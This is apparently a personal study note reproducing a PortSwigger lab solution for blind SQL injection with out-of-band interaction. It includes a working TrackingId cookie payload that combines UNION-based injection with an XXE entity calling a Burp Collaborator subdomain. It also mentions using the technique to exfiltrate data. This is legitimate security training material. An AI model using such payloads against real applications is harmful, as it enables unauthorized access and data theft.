---
{"dg-publish":true,"permalink":"/src/site/notes/src/site/notes/src/site/notes/src/site/notes/main/cs/ps-wsa-labs/sq-li/blind-sq-li-with-out-of-band-interaction/"}
---






- The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
2. Modify the `TrackingId` cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic [XXE](https://portswigger.net/web-security/xxe) techniques as follows:`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.

The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab.